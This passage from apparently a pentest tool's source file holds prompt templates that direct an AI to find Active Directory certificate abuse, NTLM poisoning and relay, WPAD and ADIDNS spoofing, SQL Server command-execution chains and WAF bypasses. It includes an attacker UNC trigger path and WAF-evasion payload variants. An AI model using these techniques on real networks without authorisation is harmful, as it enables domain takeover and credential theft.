Describe how the attacker expands from their initial foothold to reach additional systems or accounts. Reference the specific confirmed findings that enable each move. Be concrete — name the source system, the technique, and the destination system or account.

### SECTION 3 — Privilege Escalation
Describe how the attacker escalates privileges toward the highest level of access achievable in the environment (local admin, domain admin, cloud account owner, etc.). Reference the specific confirmed findings. If domain dominance is achievable, describe the final step (e.g., DCSync, Golden Ticket).

### SECTION 4 — Impact
Describe in business terms what an attacker with this access could do. What data could they exfiltrate? What systems could they hold for ransom? What services could they disrupt? What regulatory obligations are implicated? Keep this section non-technical — it is for executives.

## RULES:
- Only reference findings from the confirmed findings list above — do not invent steps
- If a section is not evidenced by confirmed findings (e.g., no lateral movement paths found), write one sentence noting this was not demonstrated during this engagement
- Write in past tense as if describing what was observed during the engagement
- Total length: 400–800 words
- Output plain prose only — no markdown, no bullet points, no headings with # or ##''';
  }

  /// ADCS (Active Directory Certificate Services) attack surface analysis.
  /// Fire condition: internal target AND (hasAd OR hasAdcs).
  /// Covers ESC1, ESC2, ESC4, ESC6, ESC8, and certificate-based persistence.
  static String adcsAttackPrompt(String deviceJson) => '''
You are an expert penetration tester specialising in Active Directory Certificate Services (ADCS). Analyze the device data below and identify EXPLOITABLE misconfigurations in the Windows PKI infrastructure.

## DEVICE DATA:
$deviceJson

## CONTEXT
Active Directory Certificate Services is the Windows PKI role. When misconfigured, it provides one of the most reliable paths to Domain Admin: obtain a certificate for a privileged account, then authenticate with Kerberos PKINIT. ADCS misconfigurations are present in the majority of enterprise Active Directory environments and are frequently overlooked during hardening. The generic AD prompts cover Kerberos and credential attacks; this prompt covers what is unique to the certificate infrastructure.

Detection signals for ADCS presence: certificate enrollment web interface paths (/certsrv/, /certenroll/) accessible on any port; LDAP accessible (CA configuration stored in the Configuration naming context); Windows CA service indicators in banner or technology data; certsrv service name; IIS with certificate services paths.

## ATTACK SURFACE

### ESC1 — User-Controlled Subject Alternative Name in Certificate Requests
Certificate templates may allow the enrolling user to specify an arbitrary Subject Alternative Name (SAN) in their request. When such a template also permits enrollment by low-privilege accounts (e.g., Domain Users or Authenticated Users) and the resulting certificate carries an EKU permitting domain authentication (Client Authentication, Smart Card Logon, PKINIT), an attacker can request a certificate claiming to be any user — including Domain Admin — without knowing their password.
Attacker objective: request a certificate with SAN set to a Domain Admin UPN → use Kerberos PKINIT to authenticate as that account → obtain a TGT for Domain Admin.
Evidence to look for: LDAP accessible (template configurations stored in CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration); CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag in template msPKI-Certificate-Name-Flag; enrollment rights granted to low-privilege groups; EKU includes Client Authentication or Smart Card Logon.
Severity: CRITICAL — direct path to Domain Admin without any credentials beyond low-privilege domain membership.

### ESC2 — Any Purpose EKU or No EKU (Unrestricted Certificate Use)
Certificate templates with the "Any Purpose" EKU or with no EKU specified can be used for any authentication purpose, including domain authentication. Combined with low-privilege enrollment rights, this allows an attacker to obtain a universally usable certificate.
Attacker objective: enroll in an Any Purpose template → use the resulting certificate for Kerberos PKINIT authentication as the enrollment account → pivot to certificate-based impersonation of privileged accounts via other misconfigurations.
Evidence to look for: msPKI-Certificate-Application-Policy containing the Any Purpose OID (2.5.29.37.0); templates with no EKU extension at all; enrollment rights for low-privilege groups.
Severity: CRITICAL when enrollment rights are permissive.

### ESC4 — Certificate Template Write Permission Abuse
If a low-privilege user or group holds write permissions (WriteDACL, WriteProperty, GenericWrite, or GenericAll) on a certificate template object in LDAP, they can modify the template to introduce any other misconfiguration — typically adding the ENROLLEE_SUPPLIES_SUBJECT flag and granting themselves enrollment rights (effectively converting the template to ESC1).
Attacker objective: identify a writable template → modify its flags and enrollment ACL → exploit via ESC1 attack path.
Evidence to look for: LDAP ACL data on template objects; any reference to write permissions on certificate template objects held by non-administrative principals; BloodHound-style output referencing certificate template nodes.
Severity: CRITICAL — any writable template is trivially converted to a domain compromise path.

### ESC6 — CA-Level EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
When the Certificate Authority itself has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, any certificate request to that CA (for any template) can include a user-specified SAN, regardless of whether individual templates allow it. This is a CA-wide equivalent of ESC1 and affects every template simultaneously.
Attacker objective: detect the CA flag → submit any certificate request with SAN set to a Domain Admin UPN → authenticate via Kerberos PKINIT.
Evidence to look for: CA configuration data in LDAP (CN=Certification Authorities); certsrv or CA management service accessible; any reference to CA flags or policy module configuration in recon data.
Severity: CRITICAL — affects all certificate templates; single CA flag enables domain compromise.

### ESC8 — NTLM Relay to Certificate Web Enrollment Endpoint
The ADCS web enrollment interface (/certsrv/) typically accepts NTLM authentication. An attacker can relay an NTLM authentication from any domain machine (coerced via print spooler, PetitPotam, or similar techniques) to the /certsrv/ endpoint and request a certificate on behalf of the coerced machine account — including Domain Controllers. A DC machine account certificate can then be used via Kerberos PKINIT to obtain a TGT for the DC, followed by a DCSync operation.
Attacker objective: coerce DC authentication → relay NTLM to /certsrv/ → obtain DC machine account certificate → PKINIT authentication → DCSync → domain compromise.
Evidence to look for: /certsrv/ or /certenroll/ paths accessible; port 443 or 80 with CA paths; IIS present alongside ADCS indicators; no EPA (Extended Protection for Authentication) or HTTPS-only enforcement on the enrollment endpoint; SMB signing disabled (enables relay).
Severity: CRITICAL — relay from any domain machine to DC certificate → full domain compromise.

### Certificate-Based Persistence
Certificates issued by a domain CA remain valid for their entire lifetime (often 1–2 years) regardless of password resets, account disables, or group membership changes. An attacker who obtains a certificate for a privileged account — via any ESC path — retains access until the certificate expires or is manually revoked.
Attacker objective: obtain certificates for multiple high-value accounts → use as persistent authentication material that survives credential rotations.
Evidence to look for: confirmed ADCS presence; any successfully obtained certificate in recon data; CA certificate validity periods.
Severity: HIGH — persistence mechanism that survives standard incident response steps.

## RULES
- Generate findings only for attack surfaces where ADCS or CA indicators are present or derivable from the recon data
- attackVector: ADJACENT for internal targets (attacker must be on the network)
- Kerberos PKINIT is the authentication mechanism for all certificate-based domain attacks — mention it in the description of any ESC finding
- Do NOT duplicate generic AD findings — focus exclusively on certificate infrastructure attack paths
- CONFIDENCE: HIGH if CA paths or ADCS service directly observed; MEDIUM if AD indicators present but ADCS not explicitly confirmed; LOW if purely inferred

''';

  /// LLMNR/NBT-NS/IPv6 poisoning and NTLM relay attack surface analysis.
  /// Fire condition: internal target AND hasAd.
  /// Covers broadcast name resolution poisoning, NTLM relay, DHCPv6/IPv6 rogue DNS, WebDAV coercion, and RPC coercion surfaces.
  static String internalNetworkCoercionPrompt(String deviceJson) => '''
You are an expert penetration tester specialising in internal network protocol attacks. Analyze the device data below and identify attack paths based on Windows name resolution weaknesses, NTLM relay opportunities, and network coercion techniques.

## DEVICE DATA:
$deviceJson

## CONTEXT
Windows networks rely on a fallback name resolution chain that can be weaponised by any attacker with internal network access. When DNS resolution fails, Windows broadcasts LLMNR and NBT-NS queries — any host on the network can respond and claim the requested name, receiving the connecting host's NTLMv2 authentication hash. Combined with NTLM relay capabilities, these techniques provide reliable initial access in unpatched environments. They require no credentials and no prior foothold — only network presence. These attacks are foundational to internal network penetration testing and are present in the vast majority of enterprise Windows environments.

## ATTACK SURFACE

### LLMNR/NBT-NS Broadcast Name Resolution Poisoning
When a Windows host fails to resolve a name via DNS, it falls back to broadcasting LLMNR (Link-Local Multicast Name Resolution, UDP/5355) and NBT-NS (NetBIOS Name Service, UDP/137) queries on the local network segment. Any host can respond to these broadcasts claiming to be the requested resource, causing the querying host to send NTLMv2 authentication credentials to the attacker.
Attacker objective: listen for broadcast name resolution queries on the network → respond claiming to be the requested resource → collect NTLMv2 challenge-response hashes from connecting hosts → crack hashes offline or relay them to other services.
Evidence to look for: internal Windows network environment; SMB port 445 or 139 accessible on any host; any indication of Windows workstations or servers (OS field, NetBIOS names, Windows service banners); LDAP accessible (domain environment); any failed name resolution events in recon data.
This attack is passive — it does not require sending any traffic to the target; only network presence on the same broadcast domain.
Severity: HIGH — reliable hash collection from any Windows host that generates a failed DNS lookup; NTLMv2 hashes for weak passwords are crackable offline.

### NTLM Relay — Captured Hashes to SMB, LDAP, and HTTP Services
NTLMv2 hashes collected via poisoning or coercion cannot be passed directly (pass-the-hash requires NT hashes, not NTLMv2), but they can be relayed in real time to other services that accept NTLM authentication. Relay bypasses the need to crack hashes entirely and achieves immediate authentication as the coerced victim.
Attacker objective: collect NTLM authentication attempts via poisoning → relay in real time to SMB shares (file access, command execution), LDAP/LDAPS (create accounts, modify ACLs, enable shadow credentials), or HTTP services (OWA, SharePoint, web applications).
Critical relay conditions and opportunities:
- SMB relay requires SMB signing to be disabled or not enforced on the target — workstations typically have signing disabled; domain controllers enforce it
- LDAP relay enables creating new domain accounts, modifying group memberships, and configuring shadow credentials — all without cracking any password
- HTTP relay (e.g., to Exchange OWA or SharePoint) can capture session cookies or access internal web applications
- Cross-protocol relay (SMB to LDAP) is particularly powerful: authentication captured over SMB is relayed to LDAP to modify AD objects
Evidence to look for: SMB port 445 accessible; LDAP port 389 or 636 accessible; any HTTP services accepting Windows Integrated Authentication; absence of SMB signing indicators; multiple Windows hosts present (relay requires at least one relayable target).
Severity: CRITICAL when LDAP relay is viable (yields AD object modification); HIGH when SMB relay is viable.

### DHCPv6 / IPv6 Rogue DNS Attack
Windows systems prefer IPv6 over IPv4 when both are available. In most enterprise networks, IPv6 is enabled on workstations but not managed — no DHCPv6 server exists. An attacker can broadcast unsolicited DHCPv6 responses assigning themselves as the IPv6 DNS server for all hosts on the segment. Once DNS queries route through the attacker's host, the attacker responds to all name resolution requests — every subsequent Windows authentication attempt (file server access, intranet site, scheduled task UNC path) sends NTLMv2 credentials to the attacker.
Attacker objective: send DHCPv6 ADVERTISE packets → become IPv6 default gateway and DNS server for all hosts → respond to all DNS queries with attacker IP → collect NTLM authentication from every host resolving any name → relay collected authentication to LDAP to create a privileged domain account.
Evidence to look for: internal Windows domain environment; IPv6 addresses or dual-stack indicators in recon data; absence of explicit IPv6 filtering; multiple Windows hosts present; LDAP accessible.
This attack affects every host on the broadcast domain simultaneously — impact scales with the number of Windows hosts.
Severity: CRITICAL — passive collection from the entire subnet; LDAP relay typically yields a new Domain Admin account within minutes of attack start.

### WebDAV Coercion via UNC Path with HTTP Fallback
The Windows WebClient service (enabled by default on workstations, often triggered on servers) handles WebDAV connections. When a UNC path using the @ notation (//attacker@80/share or file://attacker@80/share) is accessed — via a link, document, or application redirect — Windows uses HTTP rather than SMB for the connection. HTTP connections from the WebClient service send NTLM authentication without SMB signing requirements, making every WebDAV coercion relayable regardless of SMB signing configuration.
Attacker objective: trigger access to a UNC path with @ notation pointing to an attacker-controlled HTTP server → collect NTLMv2 via HTTP → relay to LDAP or other services (HTTP relay is not subject to SMB signing requirements).
Trigger surfaces: phishing links, Office documents with UNC paths in external content, search connector files (.searchconnector-ms, .library-ms), file explorer navigation.
Evidence to look for: Windows workstation OS indicators; any web application or file share that could serve documents with embedded UNC paths; WebDAV-related service indicators; port 80 accessible on the attack host path.
Severity: HIGH — bypasses SMB signing; relay to LDAP is viable from any WebDAV coercion.

### RPC-Based Authentication Coercion Surfaces
Several Windows RPC services can be triggered by any authenticated domain user to send outbound NTLM or Kerberos authentication to an attacker-specified host. These coercion primitives are useful when passive poisoning is insufficient (e.g., no LLMNR traffic, isolated segment) and when an active trigger is needed for relay.
Attacker objective: identify exposed RPC services on domain hosts → trigger an outbound authentication request to an attacker-controlled host → relay the resulting NTLM authentication to LDAP, SMB, or other services.
Coercion surface categories — generate findings for each that is evidenced:
- Print Spooler RPC service: the MS-RPRN RPC interface on any Windows host with the Print Spooler service running can be triggered by any domain user to authenticate to an arbitrary UNC path — a classic and reliable coercion primitive
- File Server VSS RPC service (MS-FSRVP): triggers authentication from file server hosts with the File Server VSS Agent service
- Distributed File System RPC (MS-DFSNM): DFS namespace server coercion, affects domain controllers running DFS
- EFSRPC (Encrypting File System RPC, MS-EFSR): triggers authentication from any Windows host with the EFS service; multiple trigger methods exist
Evidence to look for: SMB port 445 accessible; Windows OS indicators; domain environment confirmed; RPC/DCOM port 135 accessible; any indication of Windows services in banner or recon data; Print Spooler is enabled by default on all Windows Server versions prior to 2022.
Severity: HIGH — provides reliable coercion trigger; combined with LDAP relay achieves domain compromise.

## RULES
- These attacks require internal network presence — attackVector: ADJACENT for all findings
- Poisoning attacks (LLMNR, NBT-NS, DHCPv6) are passive and do not require interacting with the target host directly
- Relay attacks require real-time interception — note this in the description where relevant
- Do NOT duplicate generic AD credential or privilege escalation findings — focus on the network protocol layer
- CONFIDENCE: MEDIUM is appropriate for poisoning findings when a Windows domain environment is confirmed but specific protocol data is absent from recon (these attacks succeed in virtually all unpatched Windows environments); HIGH if specific protocol indicators are present

''';

  /// WPAD poisoning attack surface.
  /// Fire condition: internal target AND AD indicators present.
  /// Covers WPAD DNS record absence, rogue proxy credential interception.
  static String wpadPoisoningPrompt(String deviceJson) => '''
You are an expert Active Directory penetration tester. Analyze the device data below and identify WPAD (Web Proxy Auto-Discovery) attack surface. WPAD is a commonly overlooked but high-impact internal finding.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### WPAD DNS Record Absence — Rogue Proxy Attack
**What to detect:** Windows hosts automatically search for a WPAD proxy configuration file by querying DNS for "wpad.<local-domain>" and falling back to LLMNR/NBT-NS broadcasts. If no WPAD DNS record exists, any attacker on the network can respond to LLMNR/NBT-NS broadcasts claiming to be the WPAD server and serve a rogue proxy auto-configuration script. All Windows hosts with "Automatically detect settings" enabled (the Windows default) will route their HTTP/HTTPS traffic through the attacker's proxy.
**Attacker objective:** claim the WPAD name via broadcast poisoning → serve a wpad.dat file redirecting all browser traffic through an attacker-controlled proxy → intercept plaintext HTTP, capture proxy authentication credentials (many environments use NTLM proxy auth), inject malicious content into HTTP responses, or harvest NTLM hashes when browser connects to attacker proxy with Windows authentication.
**Evidence to look for:** internal Windows domain environment; DNS port 53 accessible (can confirm absence of WPAD record); LDAP present (domain environment confirmed); multiple Windows hosts present.
**Severity:** HIGH — passive traffic interception from all Windows hosts on the subnet; NTLM proxy credential capture is particularly impactful.

### WPAD + NTLM Authentication Credential Capture
**What to detect:** When the rogue WPAD server requests NTLM proxy authentication, Windows hosts automatically authenticate using their current domain credentials. This yields NTLMv2 hashes from every host that connects, at a rate that scales with browsing activity.
**Attacker objective:** combine WPAD poisoning with NTLM authentication to collect NTLMv2 hashes from all hosts → crack offline or relay to LDAP/SMB for immediate code execution.
**Evidence to look for:** Windows domain environment; any proxy-related configuration visible in recon; port 3128 (Squid proxy) or 8080 (proxy) open indicating proxy infrastructure in use.
**Severity:** CRITICAL when LDAP relay is viable (yields new domain account from every hash collected).

## RULES:
- attackVector: ADJACENT — requires LAN presence on same broadcast domain
- CONFIDENCE: MEDIUM when Windows domain environment is confirmed but WPAD DNS record absence is not verified; HIGH if DNS query confirms no WPAD record exists
- Do NOT duplicate LLMNR/NBT-NS poisoning findings already covered in the coercion prompt

''';

  /// AD-Integrated DNS (ADIDNS) poisoning attack surface.
  /// Fire condition: internal target AND AD indicators (DNS port 53 + LDAP port 389).
  /// Covers wildcard record injection via LDAP write to DNS zones.
  static String adidnsPoisoningPrompt(String deviceJson) => '''
You are an expert Active Directory penetration tester. Analyze the device data below and identify AD-Integrated DNS (ADIDNS) poisoning attack surface. ADIDNS stores DNS zone data as objects in Active Directory, allowing any authenticated domain user to add DNS records by default.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### ADIDNS Wildcard Record Injection
**What to detect:** AD-Integrated DNS zones are stored as objects under the DomainDnsZones and ForestDnsZones partitions in Active Directory LDAP. By default, all authenticated domain users have the "Create Child" permission on the DNS zone object, which allows adding arbitrary DNS records — including wildcard records ("*") that match any unresolved hostname in the domain. A wildcard record pointing to the attacker's IP causes all name resolution failures in the domain to route to the attacker.
**Attacker objective:** authenticate to LDAP as any domain user → add a wildcard A record ("*") to the domain's AD-integrated DNS zone → all hostnames that don't already have DNS records now resolve to the attacker's IP → every Windows host generating a failed DNS lookup sends NTLMv2 authentication to the attacker.
**Evidence to look for:** LDAP port 389 accessible; DNS port 53 accessible; domain environment confirmed (AD indicators present); any domain user credential obtainable or already obtained.
**Attack chain:** domain user credential → LDAP write to DNS zone → wildcard DNS record → every mistyped hostname or internal service without a record resolves to attacker → NTLMv2 hash collection at scale → relay to LDAP for domain account creation → Domain Admin.
**Severity:** CRITICAL — a single low-privilege domain credential enables DNS poisoning affecting the entire domain; combined with NTLM relay to LDAP, this is a reliable domain compromise path.

### ADIDNS Targeted Record Injection — Service Impersonation
**What to detect:** Beyond wildcards, authenticated users can add specific hostname records, allowing impersonation of services that don't currently have DNS records (old hostnames, decommissioned servers, internal services with broken DNS). Targeted injection is stealthier than wildcards and avoids disrupting existing services.
**Attacker objective:** identify internal hostnames referenced in scripts, scheduled tasks, or application configs that don't resolve → add DNS records for those hostnames → intercept connections and capture NTLM authentication or serve malicious content.
**Evidence to look for:** domain environment confirmed; any configuration files, scripts, or web application responses referencing internal hostnames visible in recon data.
**Severity:** HIGH — stealthy targeted impersonation; particularly impactful when targeting internal services that handle sensitive authentication.

## RULES:
- attackVector: ADJACENT — requires domain user credential and LAN access
- CONFIDENCE: MEDIUM when domain environment is confirmed but LDAP write access to DNS zone has not been verified; HIGH if LDAP is accessible and domain user credentials are in hand
- Do NOT duplicate generic LDAP attack findings from the AD recon/credential prompt

''';

  /// MSSQL server attack chain analysis.
  /// Fire condition: internal target AND port 1433/1434 or SQL Server in technologies/service name.
  /// Covers xp_cmdshell, linked servers, impersonation, SQL Agent, and NTLM capture via UNC paths.
  static String mssqlAttackChainPrompt(String deviceJson) => '''
You are an expert penetration tester specialising in Microsoft SQL Server attack chains. Analyze the device data below and identify exploitable paths that lead to OS-level command execution, data exfiltration, or lateral movement via SQL Server features and misconfigurations.

## DEVICE DATA:
$deviceJson

## CONTEXT
SQL Server exposes several server-side features that can be chained together to achieve OS command execution and cross-server traversal without requiring SQL injection in an application. These attack paths are often overlooked because defenders focus on application-layer SQL injection rather than the SQL Server instance itself. The attack surface exists for any user who can authenticate to the SQL Server — including with low-privilege domain credentials when Windows Authentication is in use.

## ATTACK SURFACE

### OS Command Execution via Stored Procedure
SQL Server exposes a built-in stored procedure that passes a command string to the operating system shell and returns the output. This procedure is disabled by default in modern SQL Server installations but is frequently re-enabled by administrators for operational tasks. When enabled, any SQL user with the server administrator role — or with explicit execute permission on the procedure — achieves OS-level command execution in the context of the SQL Server service account.
The SQL Server service account context determines the impact: a service account running as a managed service account or low-privilege local account limits lateral movement; an account running as SYSTEM, a local administrator, or a domain account with broad permissions makes this a CRITICAL finding.
Attacker objective: authenticate to SQL Server → check whether the stored procedure is enabled → if so, execute OS commands to enumerate the host, read sensitive files, or establish a persistent foothold.
Evidence to look for: SQL Server port accessible; any banner or version data; service account context (if visible in recon data).
Severity: CRITICAL when procedure is enabled and service account has significant OS privileges.

### Linked Server Traversal
SQL Server supports "linked servers" — named connections to remote SQL Server instances (or other OLE DB data sources) that allow executing queries on remote systems from the local instance. Linked servers are commonly configured for inter-application data sharing and are frequently configured with elevated credentials on the remote end.
An attacker with query execution capability on one SQL instance can enumerate all configured linked servers, execute queries on linked instances — including enabling and invoking OS command execution procedures on a remote linked server even if the local instance has them disabled — and chain traversals across multiple linked instances.
Attacker objective: enumerate linked servers via system catalog queries → execute cross-server queries on each linked instance → identify and invoke OS command execution on the highest-privilege linked server.
Evidence to look for: SQL Server accessible; any indication of multiple SQL Server instances in the environment (multiple IP addresses with SQL ports, server naming patterns suggesting a SQL Server farm).
Severity: CRITICAL when linked servers with elevated configurations are reachable.

### User Impersonation via EXECUTE AS
SQL Server's impersonation capability allows a database principal to execute statements as another principal. If a low-privilege login has been granted IMPERSONATE permission on a higher-privilege login — including the system administrator login — they can execute any statement in that elevated context, including enabling and invoking OS command execution.
Attacker objective: enumerate impersonatable logins via system catalog queries → impersonate the highest-privilege available login → execute privileged operations.
Evidence to look for: SQL Server authenticated access; any version information.
Severity: CRITICAL when a server administrator login is impersonatable.

### SQL Server Agent Job Code Execution
The SQL Server Agent service executes scheduled maintenance and administrative jobs. Database principals with access to the agent job subsystem can create or modify jobs that execute operating system commands, PowerShell scripts, or SSIS packages in the SQL Agent service account context. This provides an alternative OS command execution path when the standard OS command procedure is disabled.
Attacker objective: authenticate to SQL Server → verify SQL Agent service is running → create or modify an agent job with an OS command step → execute the job → retrieve output.
Evidence to look for: SQL Server accessible; SQL Agent service indicators (common in production SQL Server installations); any reference to SQL Server Agent in recon data.
Severity: HIGH — alternative code execution path; impact depends on agent service account privileges.

### NTLM Hash Capture via UNC Path Functions
SQL Server provides built-in functions that cause the SQL Server service account to make outbound file system requests to a specified UNC path. When the UNC path points to an attacker-controlled host, the SQL Server service account sends its NTLMv2 authentication credentials to the attacker. These credentials can be cracked offline or relayed to other services.
This technique requires only query execution capability — no administrative privilege is needed. It is valuable even when OS command execution is unavailable.
Attacker objective: execute a UNC path function pointing to an attacker-controlled SMB listener → capture NTLMv2 challenge-response for the SQL Server service account → crack or relay the captured hash.
Evidence to look for: SQL Server accessible; any query execution capability (including low-privilege read access).
Severity: HIGH — service account credential capture; CRITICAL if service account is a domain account with significant privileges.

### Credential and Configuration Data in SQL Server
Applications store credentials, API keys, connection strings, and configuration data in SQL Server tables. An attacker with any authenticated read access to a database can enumerate tables with credential-related naming patterns and extract stored secrets. Common patterns: connection strings in configuration tables, API credentials in settings tables, user account tables with password hashes.
Attacker objective: authenticate to SQL Server → enumerate accessible databases and tables → search for credential and configuration data by table and column name patterns → extract and use discovered credentials.
Evidence to look for: SQL Server accessible; application context (web application or business application database likely contains credential data).
Severity: HIGH — credential material for other services.

## RULES
- All findings require SQL Server network accessibility as the base evidence
- attackVector: NETWORK for all findings (SQL Server listens on a network port)
- Do NOT generate generic SQL injection findings — this prompt covers server-side SQL Server features, not application-layer injection
- CONFIDENCE: HIGH if SQL Server port and version confirmed; MEDIUM if SQL Server identified by service name or technology without port confirmation
- Severity of OS execution findings depends on the service account context — assess based on any service account information visible in recon data

''';

  /// WAF/CDN bypass analysis for externally-protected targets.
  /// Fire condition: external target AND CDN/WAF indicators detected.
  /// Covers WAF fingerprinting, encoding bypass, parameter pollution, chunked encoding, and origin IP discovery.
  static String wafBypassAnalysisPrompt(String deviceJson) => '''
You are an expert penetration tester assessing a target that is protected by a Web Application Firewall (WAF) or Content Delivery Network (CDN). Analyze the device data and identify concrete bypass paths that would allow testing the underlying application despite WAF protection. This is not about evading detection — it is about confirming whether the underlying application is actually protected or whether the WAF can be circumvented to reach the real attack surface.

## DEVICE DATA:
$deviceJson

## CONTEXT
A WAF blocking a payload does not prove the underlying application is not vulnerable — it proves only that the WAF's current ruleset blocked that specific payload format. Professional penetration testers always attempt WAF bypass when assessing externally-protected targets, because:
1. WAF protections are often incomplete, covering only known payload signatures
2. Bypasses that work in testing represent exactly the bypass a real attacker would use
3. The true vulnerability state of the application behind the WAF is what matters for risk assessment

## BYPASS ANALYSIS

### WAF Product Fingerprinting from Error Responses
Different WAF products produce distinct signatures in their block responses: specific HTTP status codes, error page HTML patterns, product-identifying response headers, and vendor-specific cookies. Identifying the WAF product narrows which bypass techniques have the highest success rate.
Testing approach: submit a clearly malicious payload (a simple SQL injection string, a script tag, or a known vulnerability path) and analyse the response — status code, response headers (look for vendor-specific headers), error page content, and any cookies set by the WAF layer.
Evidence: any HTTP error response in recon data; CDN or WAF header indicators (CF-RAY, X-Sucuri-ID, X-Cdn, vendor cookies); blocking behaviour visible in recon.
Finding: document the identified WAF product and version era if determinable. Severity: INFORMATIONAL — the value is in what bypass techniques it enables.

### Unicode and Encoding Normalisation Bypass
WAF pattern matching operates on the HTTP request as received. If the application backend normalises Unicode or encoding before processing input, payloads encoded at the byte level may pass WAF inspection while being decoded to the blocked character by the backend.
Bypass technique classes to test:
- Fullwidth Unicode equivalents of ASCII special characters (< > ' " ; -- are all representable as fullwidth Unicode codepoints)
- Overlong UTF-8 encoding: representing a single ASCII character as a multi-byte UTF-8 sequence that WAFs with strict UTF-8 parsing normalise differently than the backend
- HTML entity encoding: character references (&lt; &gt; &#x3C; &#x3E;) passed through the WAF and decoded by the HTML-rendering application layer
- URL double-encoding: %253C encodes to %3C at the WAF layer (which sees a literal percent) and to < at the application layer (which URL-decodes twice)
Evidence: any injection surface (SQL, HTML, command) behind a WAF; application that accepts HTML or processes encoded input.
Severity: HIGH when bypass enables an injection vulnerability in the underlying application.

### HTTP Parameter Pollution
Submitting a parameter multiple times with different values causes different handling in different server stacks — some use the first value, some the last, some concatenate. If the WAF inspects one instance (typically the first or last) and the application processes a different instance containing the payload, inspection is bypassed.
Testing approach: submit the target parameter twice: once with a benign value and once with a payload. Vary which position contains the payload. Also test sending the parameter in both the query string and the POST body simultaneously.
Evidence: any injection parameter; WAF inspection behaviour visible from differential responses.
Severity: HIGH when bypass enables injection.

### Case Variation and Comment Injection for Signature Bypass
WAF signature matching is frequently case-sensitive or fails to account for SQL/HTML syntax variants. Alternatives to test:
- SQL keyword case variation (SeLeCt, UnIoN, AnD) — bypasses case-sensitive signatures
- SQL comment injection to break keyword patterns (SE/**/LECT, UN/**/ION) — SQL parsers ignore inline comments; WAF pattern matchers often do not
- Whitespace substitution: tabs, newlines, carriage returns, and multiple spaces are equivalent whitespace in SQL and HTML but may not match the WAF's single-space pattern
- HTML tag variations for script injection: attribute quoting variants, event handler capitalisation, uncommon event handlers
Evidence: SQL or HTML injection surface behind WAF.
Severity: HIGH when bypass confirms underlying injection vulnerability.

### Request Fragmentation via Chunked Transfer Encoding
Sending an HTTP/1.1 request body in many small chunks distributes the payload across multiple TCP segments. WAFs that reassemble chunks before inspection may have buffer limits or performance thresholds that cause incomplete inspection of large or highly-fragmented payloads.
Testing approach: send the HTTP body using chunked transfer encoding with each chunk containing only a few bytes of the payload — the WAF sees fragments; the backend reassembles the complete payload before processing.
Evidence: HTTP/1.1 accepted; chunked encoding not rejected; any injection surface.
Severity: HIGH when chunked fragmentation bypasses WAF inspection of a real vulnerability.

### Origin Server IP Discovery — Full WAF Bypass
The most complete WAF bypass: identify the origin server's IP address and connect to it directly, bypassing the WAF entirely. The WAF only protects traffic routed through it — direct connections to the origin are unfiltered.
Discovery techniques:
- Historical DNS records: the origin IP may be visible in older DNS A record data (before CDN deployment)
- SPF record IP ranges: SPF records for the domain frequently reference the origin mail server's IP, and the web application may be on the same IP or in the same subnet
- Certificate Transparency logs: certificates for the domain may show the origin IP in their Subject Alternative Names or may have been issued before CDN deployment
- Subdomain DNS leakage: subdomains not routed through the CDN (staging, dev, mail, vpn) may resolve directly to the origin infrastructure and share the same IP block
- HTTP response content comparison: a direct connection to a candidate IP that returns identical content fingerprints (same HTML, same resource hashes) as the CDN-proxied response confirms origin identity
Evidence: CDN-fronted target; any DNS, SPF, or certificate data in recon. Severity: CRITICAL if origin IP found — all WAF protections bypassed for direct connection.

## RULES
- Generate findings only for a target where WAF/CDN presence is evidenced in recon data
- attackVector: NETWORK for all findings
- Do NOT generate generic application vulnerability findings — this prompt focuses exclusively on WAF bypass paths
- CONFIDENCE: HIGH if WAF product identified and bypass technique is known effective against that product; MEDIUM for generic bypass techniques applicable to all WAFs
- The origin IP discovery finding is always CRITICAL if origin IP is evidenced — direct bypass

''';

  /// DNS zone transfer and certificate transparency OSINT for external targets.
  /// Expands the existing DNS OSINT coverage with AXFR/IXFR zone transfer testing
  /// and certificate transparency log enumeration.
  static String dnsCertificateTransparencyPrompt(String deviceJson) => '''
You are an expert penetration tester performing external reconnaissance. Analyze the device data below and identify attack surfaces exposed through DNS configuration weaknesses and certificate transparency logs. These are passive and active reconnaissance techniques that reveal infrastructure the organisation may not intend to be publicly visible.

## DEVICE DATA:
$deviceJson

## ATTACK SURFACE

### DNS Zone Transfer (AXFR / IXFR)
DNS zone transfers are a legitimate DNS mechanism for synchronising zone data between primary and secondary nameservers. When a nameserver is misconfigured to allow zone transfers from any source (rather than restricting to authorised secondary servers), an attacker can request a complete copy of the DNS zone — revealing every hostname, IP address, mail server, and service in the domain in a single query.
What a successful zone transfer reveals: A records (all hostnames and their IPs), MX records (mail infrastructure), CNAME records (aliases, CDN configurations, third-party integrations), TXT records (SPF, DKIM, verification codes, internal notes), SRV records (service discovery for internal protocols), NS records (nameserver infrastructure), and any internal naming conventions visible from the zone data.
Testing approach:
- Identify all nameservers for the target domain from NS record lookups (typically 2–4 nameservers)
- Attempt a zone transfer request (AXFR) to each nameserver individually — zone transfer restrictions are configured per-nameserver and may be inconsistent
- Also attempt IXFR (incremental zone transfer) — some servers refuse AXFR but accept IXFR
- A nameserver that responds with zone data rather than a REFUSED or SERVFAIL error confirms the misconfiguration
Evidence: target domain identified; nameserver records present in recon data. Severity: HIGH — complete internal DNS topology exposed.

### Certificate Transparency Log Enumeration
Every SSL/TLS certificate issued by a publicly-trusted certificate authority is logged in public Certificate Transparency (CT) logs, which are queryable without authentication. CT logs contain the complete certificate history for a domain — including certificates for subdomains, internal development environments, and services that have since been decommissioned.
What CT log enumeration reveals:
- All subdomains for which certificates have ever been issued, including: internal development environments (dev., staging., test., uat., internal.), administrative interfaces, API endpoints, and one-off project subdomains
- Wildcard certificate usage patterns that indicate the breadth of the subdomain space
- Historical infrastructure: certificates issued before a service was decommissioned may reveal naming conventions and IP ranges still in use internally
- Certificate issuance timing: certificate creation dates reveal when services were stood up or rotated
- Multi-SAN certificates: a single certificate may list many subdomains in its Subject Alternative Names field
Testing approach: query CT log aggregators for the target domain using wildcard search syntax to retrieve all certificates ever issued for the domain and its subdomains. Parse results for unique hostnames. Test each discovered hostname for DNS resolution — hostnames that still resolve are live targets; hostnames that no longer resolve may still have infrastructure reachable by IP.
